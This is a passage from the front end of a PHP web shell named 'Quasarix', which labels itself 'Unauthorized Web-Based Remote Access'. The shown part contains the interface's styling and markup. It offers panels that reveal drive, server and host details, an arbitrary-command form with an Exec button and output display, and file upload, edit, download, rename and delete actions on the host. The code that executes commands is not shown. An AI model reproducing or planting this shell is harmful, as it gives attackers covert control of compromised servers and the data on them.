        .rename-form input[type="text"] { width: 200px; padding: 5px 8px; font-size: 12px; background: var(--panel); border: 1px solid var(--accent); border-radius: 6px; color: var(--text); }
        .rename-form button { padding: 5px 10px; font-size: 12px; }
        .rename-cancel { padding: 5px 10px; font-size: 12px; background: transparent; border: 1px solid var(--border); color: var(--muted); border-radius: 6px; cursor: pointer; }
        .rename-cancel:hover { background: var(--hover); color: var(--text); }
        .output        { margin-top: 24px; }
        .output strong { display: block; margin-bottom: 6px; color: var(--accent); }
        .output pre    { background: var(--panel); border: 1px solid var(--border); padding: 12px; border-radius: 8px; font-size: 12px; color: var(--muted); white-space: pre-wrap; }
        @media (max-width: 768px) { .footer { left: 0; } }
        /* Root switcher dropdown */
        .root-switcher {
            position:    relative;
            display:     inline-block;
            vertical-align: middle;
        }
        .root-switcher-label {
            display:       inline-flex;
            align-items:   center;
            gap:           4px;
            cursor:        pointer;
            padding:       2px 7px;
            border:        1px solid var(--border);
            border-radius: 6px;
            color:         var(--accent);
            font-size:     12px;
            background:    var(--panel2);
            user-select:   none;
            -webkit-user-select: none;
            transition:    background 0.15s;
        }
        .root-switcher-label:hover { background: var(--hover); }
        .root-caret { font-size: 9px; opacity: 0.7; }
        .root-dropdown {
            display:       none;
            position:      fixed;
            top:           0;
            left:          0;
            z-index:       9999;
            background:    var(--panel);
            border:        1px solid var(--border);
            border-radius: 8px;
            list-style:    none;
            margin:        0;
            padding:       4px 0;
            min-width:     180px;
            max-height:    260px;
            overflow-y:    auto;
            box-shadow:    0 6px 20px rgba(0,0,0,0.45);
        }
        .root-dropdown.open { display: block; }
        .root-dropdown li { margin: 0; padding: 0; }
        .root-dropdown li a {
            display:     block;
            padding:     7px 14px;
            font-size:   12px;
            color:       var(--text);
            white-space: nowrap;
            overflow:    hidden;
            text-overflow: ellipsis;
        }
        .root-dropdown li a:hover { background: var(--hover); color: var(--accent); }
        .root-dropdown li.active a {
            color:       var(--accent);
            font-weight: bold;
            background:  rgba(77,163,255,0.08);
        }
        #searchBox {
			background: var(--panel2);
			border: 1px solid var(--border);
			color: var(--text);
			font-size: 11px;
			padding: 3px 6px;
			border-radius: 6px;
			width: 140px;
		}
		#extFilter {
			background: var(--panel2);
			border: 1px solid var(--border);
			color: var(--text);
			font-size: 11px;
			padding: 3px;
			border-radius: 6px;
		}
    </style>
</head>
<body>
<div class="sidebar">
    <div style="margin-bottom:14px; padding:10px; border:1px solid var(--border); border-radius:10px; background:var(--panel2); text-align:center;">
        <div style="font-family:'Orbitron',sans-serif; font-size:20px; color:var(--accent); font-weight:bold;">Quasarix</div>
        <div style="font-size:11px; color:var(--muted); margin-top:4px;">Unauthorized Web-Based Remote Access</div>
        <div style="font-size:11px; color:var(--muted); margin-top:4px;">Author: 4steroth</div>
        <form method="get" style="margin-top:10px;">
            <button type="submit" name="logout" value="true" style="width:100%; padding:6px;">Delete Auth Cookie</button>
        </form>
    </div>
    <div class="card">
        <h3 style="font-family:'Orbitron',sans-serif;">Drive/Mount</h3>
        <?php foreach ($drive_info as $label => $value): ?>
            <div class="info-row">
                <div class="info-label"><?php echo htmlspecialchars($label); ?></div>
                <div class="info-value"><?php echo htmlspecialchars($value); ?></div>
            </div>
        <?php endforeach; ?>
    </div>
    <div class="card">
        <h3 style="font-family:'Orbitron',sans-serif;">Server</h3>
        <?php foreach ($system_info as $label => $value): ?>
            <div class="info-row">
                <div class="info-label"><?php echo htmlspecialchars($label); ?></div>
                <div class="info-value"><?php echo htmlspecialchars($value); ?></div>
            </div>
        <?php endforeach; ?>
    </div>
    <div class="card">
        <h3 style="font-family:'Orbitron',sans-serif;">Host</h3>
        <?php foreach ($host_info as $label => $value): ?>
            <div class="info-row">
                <div class="info-label"><?php echo htmlspecialchars($label); ?></div>
                <div class="info-value"><?php echo htmlspecialchars($value); ?></div>
            </div>
        <?php endforeach; ?>
    </div>
</div>
<div class="navbar">
    <a href="?path=<?php echo encodePathUrl(getcwd()); ?>" style="font-family:'Orbitron',sans-serif;">Home</a>
    <!-- Upload -->
    <div class="nav-group">
        <form method="post" enctype="multipart/form-data" class="mini-form">
            <input type="file" name="file">
            <button type="submit">Upload</button>
        </form>
    </div>
    <div class="nav-group">
        <form method="post" action="?path=<?php echo encodePathUrl($path); ?>&amp;action=create_folder" class="mini-form">
            <input type="text" name="name" placeholder="dir name">
            <button type="submit">Create</button>
        </form>
    </div>
    <div class="nav-group">
        <form method="post" class="mini-form">
            <input type="text" name="cmd" placeholder="command">
            <button type="submit" onclick="sessionStorage.setItem('scrollToBottom','1')">Exec</button>
        </form>
    </div>
</div>
<div class="breadcrumb">
    <?php echo format_path($path, $mounts); ?>
</div>
<form id="rename-form" method="post"
      action="?path=<?php echo encodePathUrl($path); ?>&amp;action=rename"
      style="display:none;">
    <input type="hidden" name="old" id="rename-old">
    <input type="hidden" name="new" id="rename-new">
</form>
<div class="main">
    <?php if ($flash): ?>
        <div class="toast <?php echo htmlspecialchars($flash['type']); ?>" id="flash-toast">
            <span class="toast-icon"><?php echo $flash['type'] === 'success' ? '&#10003;' : '&#10007;'; ?></span>
            <span><?php echo htmlspecialchars($flash['msg']); ?></span>
            <button class="toast-close" onclick="document.getElementById('flash-toast').remove()" title="Dismiss">&times;</button>
        </div>
    <?php endif; ?>
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Type</th>
                <th>Size</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
        <?php foreach ($dir_contents as $entry):
            if ($entry === '.') continue;
            $full    = $path . DIRECTORY_SEPARATOR . $entry;
            $dir_enc = encodePathUrl($path);
            $enc     = urlencode($entry);
            $is_dir  = is_dir($full);
            $row_id  = 'row-' . md5($entry);
        ?>
            <tr id="<?php echo $row_id; ?>">
                <td>
                    <?php if ($is_dir): ?>
                        <a href="?path=<?php echo encodePathUrl($full); ?>"><?php echo htmlspecialchars($entry); ?></a>
                    <?php else: ?>
                        <?php echo htmlspecialchars($entry); ?>
                    <?php endif; ?>
                </td>
                <td><?php echo $is_dir ? 'DIR' : 'FILE'; ?></td>
                <td><?php echo $is_dir ? '&mdash;' : format_size((int) filesize($full)); ?></td>
                <td>
                    <div class="actions">
                        <?php if (!$is_dir): ?>
                            <a class="act-btn"
                               href="?path=<?php echo $dir_enc; ?>&amp;action=view&amp;file=<?php echo $enc; ?>"
                               title="View">&#9635;</a>
                            <a class="act-btn"
                               href="?path=<?php echo $dir_enc; ?>&amp;action=edit&amp;file=<?php echo $enc; ?>"
                               title="Edit">&#9998;</a>
                            <a class="act-btn"
                               href="?path=<?php echo $dir_enc; ?>&amp;action=download&amp;file=<?php echo $enc; ?>"
                               title="Download">&#11015;</a>
                        <?php endif; ?>
                        <button class="act-btn"
                                title="Rename"
                                onclick="toggleRename('<?php echo $row_id; ?>', '<?php echo htmlspecialchars(addslashes($entry)); ?>')">
                            &#9881;
                        </button>
                        <a class="act-btn danger"
                           href="?path=<?php echo $dir_enc; ?>&amp;action=delete&amp;target=<?php echo $enc; ?>"
                           title="Delete"
                           onclick="return confirm('Delete <?php echo htmlspecialchars(addslashes($entry)); ?>?')">&#10006;</a>
                    </div>
                </td>
            </tr>
            <tr class="rename-row" id="rename-<?php echo $row_id; ?>">
                <td colspan="4">
                    <div class="rename-form">
                        <span style="font-size:12px; color:var(--muted); white-space:nowrap;">Rename to:</span>
                        <input type="text"
                               id="rinput-<?php echo $row_id; ?>"
                               value="<?php echo htmlspecialchars($entry); ?>"
                               onkeydown="if(event.key==='Enter'){submitRename('<?php echo $row_id; ?>','<?php echo htmlspecialchars(addslashes($entry)); ?>')}
                                          if(event.key==='Escape'){closeRename('<?php echo $row_id; ?>')}">
                        <button onclick="submitRename('<?php echo $row_id; ?>','<?php echo htmlspecialchars(addslashes($entry)); ?>')">&#10003; Apply</button>
                        <button class="rename-cancel" onclick="closeRename('<?php echo $row_id; ?>')">Cancel</button>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
    <?php if ($command_output !== ''): ?>
        <div class="output">
            <strong>Output</strong>
            <pre><?php echo htmlspecialchars($command_output); ?></pre>
        </div>
    <?php endif; ?>
</div>
<script>
    var _openRenameRow = null;
    // Root-switcher — portal dropdown into <body> to escape all overflow clipping
    (function () {
        var dd = document.getElementById('root-switcher-dd');
        if (dd) { document.body.appendChild(dd); }
    }());
    function toggleRootSwitcher(e) {
        if (e && e.stopPropagation) { e.stopPropagation(); }
        var label = e.currentTarget || e.target;
        var dd    = document.getElementById('root-switcher-dd');
        if (!dd || !label) return;
        var isOpen = dd.className.indexOf('open') !== -1;
        if (isOpen) {
            dd.className = 'root-dropdown';
        } else {
            var rect     = label.getBoundingClientRect();
            dd.style.top  = (rect.bottom + 4) + 'px';
            dd.style.left = rect.left + 'px';
            dd.className  = 'root-dropdown open';
        }
    }
    document.addEventListener('click', function (e) {
        var sw = document.getElementById('root-switcher');
        var dd = document.getElementById('root-switcher-dd');
        if (!dd || !sw) return;
        if (!sw.contains(e.target)) {
            dd.className = 'root-dropdown';
        }
    });
    function toggleRename(rowId, currentName) {
        if (_openRenameRow && _openRenameRow !== rowId) {
            closeRename(_openRenameRow);
        }
        var renameRow = document.getElementById('rename-' + rowId);
        if (!renameRow) return;
        if (renameRow.className.indexOf('open') !== -1) {
            closeRename(rowId);
        } else {
            openRename(rowId, currentName);
        }
    }
    function openRename(rowId, currentName) {
        var renameRow = document.getElementById('rename-' + rowId);
        var input     = document.getElementById('rinput-' + rowId);
        if (!renameRow || !input) return;
        renameRow.className = 'rename-row open';
        input.value = currentName;
        _openRenameRow = rowId;
        try { input.focus(); input.select(); } catch (e) {}
    }
    function closeRename(rowId) {
        var renameRow = document.getElementById('rename-' + rowId);
        if (renameRow) { renameRow.className = 'rename-row'; }
        if (_openRenameRow === rowId) { _openRenameRow = null; }
    }
    function submitRename(rowId, oldName) {
        var input   = document.getElementById('rinput-' + rowId);
        var newName = input ? (input.value || '').replace(/^\s+|\s+$/g, '') : '';
        if (!newName || newName === oldName) {
            closeRename(rowId);
            return;
        }
        var oldField = document.getElementById('rename-old');
        var newField = document.getElementById('rename-new');
        var form     = document.getElementById('rename-form');
        if (!oldField || !newField || !form) return;
        oldField.value = oldName;
        newField.value = newName;
        form.submit();
    }
    (function () {
        if (sessionStorage.getItem('scrollToBottom') !== '1') return;
        sessionStorage.removeItem('scrollToBottom');
        window.addEventListener('load', function () {
            window.scrollTo(0, document.body.scrollHeight);
        });
    }());
    (function () {
        var toast = document.getElementById('flash-toast');
        if (toast) {
            setTimeout(function () {
                if (toast.parentNode) { toast.parentNode.removeChild(toast); }
            }, 5000);
        }
    }());
    (function () {
		function updateClock() {
		    var now = new Date();
		    var h = now.getHours();
		    var m = now.getMinutes();
		    var s = now.getSeconds();
		    var ampm = h >= 12 ? 'PM' : 'AM';
		    h = h % 12 || 12;
		    function pad(n) { return n < 10 ? '0' + n : n; }
		    var str = h + ':' + pad(m) + ':' + pad(s) + ' ' + ampm;
		    var el = document.getElementById('clock');
		    if (el) el.textContent = str;
		}
		updateClock();
		setInterval(updateClock, 1000);
	})();
	(function () {
		const searchBox = document.getElementById('searchBox');
		const extFilter = document.getElementById('extFilter');
		const rows = document.querySelectorAll('table tbody tr');
		function getExtension(filename) {
		    const parts = filename.split('.');
		    return parts.length > 1 ? parts.pop().toLowerCase() : '';
		}
		function filterFiles() {
		    const query = (searchBox.value || '').toLowerCase();
		    const ext = (extFilter.value || '').toLowerCase();
		    rows.forEach(row => {
		        if (row.classList.contains('rename-row')) return;
		        const nameCell = row.children[0];
		        if (!nameCell) return;
		        const name = nameCell.textContent.trim().toLowerCase();
		        const fileExt = getExtension(name);
		        const matchSearch = !query || name.includes(query);
		        const matchExt = !ext || fileExt === ext;
		        row.style.display = (matchSearch && matchExt) ? '' : 'none';
		    });
		}
		searchBox.addEventListener('input', filterFiles);
		extFilter.addEventListener('change', filterFiles);
	})();
</script>
</body>
<div class="footer">
    <span>
        Quasarix WB-RA • <?php echo date('Y'); ?>
    </span>
    <span class="footer-actions">
        <span id="clock"></span>
        <input id="searchBox" placeholder="Search files..." />
        <select id="extFilter">
			<option value="">All Files</option>
			<optgroup label="Web">
				<option value="php">PHP</option>
				<option value="html">HTML</option>
				<option value="css">CSS</option>
				<option value="js">JavaScript</option>
				<option value="ts">TypeScript</option>
				<option value="json">JSON</option>
				<option value="xml">XML</option>
				<option value="wasm">WASM</option>
			</optgroup>
			<optgroup label="Backend">
				<option value="sql">SQL</option>
				<option value="db">Database</option>
				<option value="sqlite">SQLite</option>
				<option value="env">ENV</option>
				<option value="log">LOG</option>
				<option value="conf">CONF</option>
				<option value="ini">INI</option>
			</optgroup>
			<optgroup label="Scripts">
				<option value="sh">Shell (SH)</option>
				<option value="bash">Bash</option>
				<option value="ps1">PowerShell</option>
				<option value="bat">Batch</option>
				<option value="py">Python</option>
				<option value="rb">Ruby</option>
				<option value="pl">Perl</option>
			</optgroup>
			<optgroup label="Data">
				<option value="txt">Text</option>
				<option value="md">Markdown</option>
				<option value="csv">CSV</option>
				<option value="yml">YAML</option>
				<option value="yaml">YAML Alt</option>
				<option value="toml">TOML</option>
				<option value="props">Properties</option>
			</optgroup>
			<optgroup label="Archives">
				<option value="zip">ZIP</option>
				<option value="rar">RAR</option>
				<option value="7z">7Z</option>
				<option value="tar">TAR</option>
				<option value="gz">GZ</option>
				<option value="bz2">BZ2</option>
			</optgroup>
			<optgroup label="Media">
				<option value="jpg">JPG</option>
				<option value="jpeg">JPEG</option>
				<option value="png">PNG</option>
				<option value="gif">GIF</option>
				<option value="webp">WEBP</option>
				<option value="svg">SVG</option>
				<option value="mp4">MP4</option>
				<option value="mkv">MKV</option>
				<option value="mp3">MP3</option>
				<option value="wav">WAV</option>
			</optgroup>
			<optgroup label="System">
				<option value="bak">BAK</option>
				<option value="old">OLD</option>
				<option value="tmp">TMP</option>
				<option value="cache">CACHE</option>
				<option value="swp">SWP</option>
				<option value="lock">LOCK</option>
			</optgroup>
			<optgroup label="Executables">
				<option value="exe">EXE</option>
				<option value="dll">DLL</option>
				<option value="so">SO</option>
				<option value="bin">BIN</option>
			</optgroup>
		</select>
    </span>
</div>
</html>
